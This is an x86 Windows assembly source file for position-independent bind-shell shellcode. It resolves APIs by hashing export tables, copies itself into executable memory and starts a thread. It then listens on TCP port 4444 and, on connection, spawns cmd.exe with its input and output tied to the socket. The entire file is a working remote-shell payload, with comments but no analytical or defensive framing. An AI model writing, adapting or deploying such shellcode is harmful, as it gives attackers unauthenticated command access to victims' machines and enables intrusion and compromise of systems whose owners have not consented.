[BITS 32]

global _start

_start:

cld				; clear direction flag
;LPVOID WINAPI VirtualAlloc(  _In_opt_  LPVOID lpAddress,  _In_      SIZE_T dwSize,  _In_      DWORD flAllocationType,  _In_      DWORD flProtect)
;VirtualAlloc	0x54CAAF91
xor eax,eax
mov esi,0x159			; shellcode size
push byte 0x40			; 0x40 PAGE_READ/WRITE_EXECUTE
push 0x1000			; MEM_COMMIT
push esi			; PUSH SIZE
push eax			; address = NULL
push 0x91AFCA54
call api_call

mov edx,eax			; edx = &memory
mov edi,eax			; prepare edi with memory address for rep movsb
mov ecx,esi			; put size in ecx

call payload
save:
pop esi				;save address of payload in memory
rep movsb			; move bytes from address at esi to addr at edi untill ecx is zero
call thread			;


thread:
;CreateThread(lpthreadatrributes,dwstacksize,lpstartaddress,lpparameter,dwcreateionflag,lpthreadid)
;CreateThread(*SECURITY_ATTRIBUTES,0,address of accept,0,0,NULL)
        xor eax,eax
	push dword [fs:eax]
	mov [fs:eax],esp
        push eax                ; lpthreadid = NULL
        push eax                ; dwcreationflag = 0
        push eax                ; lpparameter = NULL
        push edx                ; lpstartaddress
        push eax                ; dwstacksize
        push eax                ; pointer to SECURITY_ATTRIBUTES STRUCT
        push 0xCA2BD06B         ; push hash of createthread()
        call api_call           ; call createthread()
	pop eax
	pop eax
	pop eax
	sub esp,44

jmp exit
;pop eax
payload:
call save
cld
call start
; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.

api_call:
	pushad 			; save registers
	mov ebp,esp		; set ebp to be the stack pointer
	xor edx,edx		; zeroout edx
	mov edx,[fs:edx + 0x30]		;edx -> PEB
	mov edx,[edx + 0x0c]			; edx -> PEB.ldr
	mov edx,[edx + 0x14]			; edx-> PEB.ldr.InMemoryOrder.flink list
next_mod:
	mov esi,[edx + 0x28]			; esi - > module name (unicode)
	push edx						; save position in list 
	mov edx,[edx + 0x10]			; get this module base addr
	mov eax,[edx + 0x3c]			; jump over the PE header
	mov eax,[edx + eax + 0x78]		; eax = export table rva ; edx (module Base addr) ; eax (module based addr + PE header)
	test eax,eax					; test if no export table is present
	jz get_next_mod1				; if no EAT present process next module
	add eax,edx						; eax = export table va
	push eax						; save current module export table address
	mov ecx,[eax + 0x18]			; load ecx with the number of functions in module
	mov ebx,[eax + 0x20]			; ebx = rva of function names table
	add ebx,edx						; add the modules base addr ebx = absolute address of names table
get_next_func:
	jecxz get_next_mod				; if ecx = zero
	dec ecx							; decrease ecx
	mov esi,[ebx + ecx * 4]			; esi = rva of function ; ebx = &names table	;ecx = number of functions
	add esi,edx						; esi  = &function
	xor edi,edi						; zero out edi to hold the function hash
	xor eax,eax						; zero out eax 
loop_funcname:
; i had to fix this bit up to take hash of function only produced by get hashed by corelancoder and not to cimpute or use module hash
	lodsb							; load byte from esi to eax and increase esi
	test al,al						; compare al with ah (NULL) to see if we reached end of string 	
	jz compute_hash_finished
	ror edi,0xd						; rotate edi 13 bits to the right
	add edi,eax						; add byte to hash accumulator
	jmp loop_funcname				; loop until end of string is reached
compute_hash_finished:
	cmp edi,[ebp + 0x24]			; compare function hash with pushed(requested) hash
	jnz get_next_func				; if not found jump to next function
	; if found, fix up stack, call the function, else compute the next one
	pop eax							; pop current module EAT
	mov ebx,[eax + 0x24]			; ebx = ordinal table rva
	add ebx,edx						; ebx = &ordinal table
	mov cx,[ebx + 2 * ecx]			; get the desired function ordinal  ecx = function counter
	mov ebx,[eax + 0x1c]			; ebx = function address table rva
	add ebx,edx						; ebx = &address table
	mov eax,[ebx + 4 * ecx]			; eax =  function RVA
	add eax,edx						; eax = &function
;we know fixup the stack and call the function
finish:
; also there is a fixup here to accomodat stack changes done to shellcode
	mov [esp + 0x20],eax			; put function address instead of eax for next popad
	pop ebx							; clear postiion in Memory order list
	popad							; restore registers
	pop ecx							; pop to ecx the current return address
	pop edx							; pop to edx requested function hash
	push ecx						; push return address of caller
	jmp eax							; jump to function
	; we know return to the correct caller
get_next_mod:
	pop eax							; pop off the current now previous module EAT
get_next_mod1:
	pop edx							; restore our position in MemoryOrder List
	mov edx,[edx]					; get next module in list
	jmp short next_mod
start:
	pop ebp
; get functions in ws2_32.dll
;ws2_32.dll		77 73 32 5f 33 32 2e 64 6c 6c
	xor eax,eax
	push 0xff206c6c		; push ws2_32.dll
	push 0x642e3233		; to stack
	push 0x5f327377
	mov [esp+0xA],al	; replace 10th character with NULL
	push esp			; push stack
	push 0xec0e4e8e		; push loadlibraryA hash
	call ebp		; call LoadLibraryA(user32.dll)
	mov edx,eax			; mov pointer to user32.dll to edx
;WSAStartup(WORD wVersionRequested,struct LPWSADATA lpWSAData)
	xor edx,edx		; zero out edx
	mov dh,0x03		; size of WSADATA is 0x300
	sub esp,edx		; save space on stack for WSADATA
; initialize WSAStartup socket
	xor ecx,ecx
	inc ecx
	inc ecx
	push esp		; use stack for WSADATA
	push ecx		; wversionrequest 2
	push 0x3BFCEDCB		; push WSAStartup hash on stack
	call ebp		; call api_call WSAStartup		
	add esp,0x0300		; return stack to original position after WSADATA
;WSASocket(int af,itn type,int protocol, lpprotocolinfo,group g,DWORD dwflags)
;WSASocket(2,1,0,0,0,0)
	xor eax,eax		; zero out eax
	push eax		; dwflags = 0
	push eax		; g = 0
	push eax		; lpprotocolinfo = NULL
	push eax		; protocol = 0
	inc eax			; eax = 1
	push eax		; type = 1 = SOCK_STREAM
	inc eax			; eax = 2
	push eax		; af = 2 = AF_INET
	push 0xADF509D9	; push WSASocketA hash
	call ebp		; call WSASocket
	mov esi,eax		; save socket file discriptor in esi
;bind(socket s, sockaddr_in *name,namelen)
;sockaddr_in{short sin_family,sin_port,in_addr sin-addr,sin_zero}
;sockaddr_in{AF_INET,htons(4444),0,0}
;bind(esi,&sockaddr_in,0,sizeof(sockaddr_in))
	xor eax,eax
;struct sockaddr_in begin
	push eax		; sin_zero = 0
	push eax		;
	push eax		; sin_addr = NULL
	mov eax,0x5c110102	; eax = htons(4444)0102
	dec ah 			; eax  = htons(4444)0002
	push eax		; *sockaddr_in on stack
	mov eax,esp		; eax has pointer to struct sockaddr_in
;struct sockadd_in end
	xor ebx,ebx		; zero out ebx
	mov bl,0x10		; set low order byte of ebx to 10 size of struct
	push ebx		; namelen = ebx = 10
	push eax		; *name = pointer located at eax (pointer to struct)
	push esi		; s  = socket file descriptor at esi returned by WSASocketA
	push 0xC7701AA4	; push bind() function hash
	call ebp		; call bind
;listen(socket s, backlog)
;listen(esi, ebx(0x10))
	push ebx		; backlog = 0x10
	push esi		; s  = esi
	push 0xE92EADA4	; push listen() function
	call ebp		; call listen()
;accept(socket s, sockaddr *addr, *addrlen_
;accept(esi,output *struct(ecx),pointer to length)
	push ebx		; addr len ebx = 0x10 
	mov edx,esp		; save pointer to addrlen in edx ; edx = &ebx
	sub esp,ebx		; save 16 bytes on stack for ouput struct addr to the accept
	mov ecx,esp		; ecx now hold the *to the addr output struct 
	push edx		; *addrlen = edx
	push ecx		; *output struct
	push esi		; socket file descriptor
	push 0x498649E5	; push accept() function hash
	;INT3
	call ebp		; call accept()
	;INT3
	mov esi,eax		; save the client file descriptor in esi
; put "cmd" on stack
	mov eax,0x646d6301	; mov "cmd01" to eax
	sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
	push eax		; push cmd on stack
	mov ebx,esp	; save pointer to cmd in ebp+0x20
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
;struct STARTUPINFO{cb,lpreserved,lpdesktop,lptitle,dwx,dwy,dwxsize,dwysize,dwxcountchars,dwycountchars,dwfillattribute,dwflages,wshowwindow,cbreserved2,lpreserved2,hstdInput,hStdOutput,hStdError}
;struct PROCESSINFORMATION{hProcess,hThread,dwProcessId,dwThreadId}
;structs initalization
	xor ecx,ecx		; zero out ecx
	mov cl,0x54		; set the low order of bytes to 0x54 which is going to represent the size of STARTUPINFO and PROCESSINFO on stack 
	sub esp,ecx		; allocate space for structs on stack
	mov edi,esp		; set edi to point to STARTUPINFO struct
	push edi		; save edi on stack
	xor eax,eax		; zero out eax for use with stosb to zeroout the 2 structs
	rep stosb		; repeat moving eax byte by byte starting by addr pointed to by edi until ecx = 0x54 is zero
	pop edi			; restore original value of edi pointer to STARTUPINFO Struct
;struct STARTUPINFO begin
	mov BYTE  [edi],0x44	; sets the cb attribute to 0x44 the size of the structure
	inc BYTE  [edi+0x2d]	; set dwflags STARTF_USESTDHANDLES flag to indicate that the hStdInput,hStdOutput,hStdError attributes should be used
	push edi 		; save edi on stack
	mov eax,esi		; set eax to the client file descriptor
	lea edi, [edi+0x38]	; load the addr of hStdInput attribute
	stosd			; store dwrod at eax to addr pointed to by edi hStdinput  eax  = client file descriptor and increment edi 
	stosd 			; store dword at eax to addr pointed to by edi hStdOutput 
	stosd			; store dword at eax to addr pointed to by edi hStdError
	pop edi			; restore edi to original value which is pointer to STARTUPINFO struct
;struct STARTUPINFO end
	lea esi,[edi+0x44]	; load the effective address of struct PROCESS INFORMATION to esi we got that because the cb attribute in the startupinformation attribute show the size of the struct
;createprocess
	xor eax,eax		; zero out eax 
	push esi		; push the pointer to the PROCESSINFORMATION struct to lpProcessInformation attribute
	push edi		; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute  
	push eax		; set lpstartupdirectory to NULL
	push eax		; set the lpEnviroment to NULL
	push eax		; set the dwcreationflag to 0
	inc eax			; eax = 1
	push eax		; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
	dec eax			; eax = 0
	push eax		; set lpthreadAttributes argument as NULL
	push eax 		; set lpProcessAttributes argument as NULL
	push ebx		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
	push eax		; set lpApplicationName argument to NULL
	push 0x16B3FE72	; push createprocessfunction()
	call ebp		; call createprocess
;exitprocess	0x7ED8E273
;	push 0x73E2D87E
;	call ebp
;0xE4CFCDE8              GetCurrentThread
push 0xE8CDCFE4		; GetCuurentThread() hash	
call ebp		; call it current thread handle is in eax
;0x896F01BD              TerminateThread
xor ecx,ecx		; zero out ecx
push ecx		; dw milliseconds = 0
push eax		; push current thread handle
push 0xBD016F89		; push TerminateThread() hash
call ebp		; call TerminateThread(handle,dwmilliseconds)
nop
nop
exit:
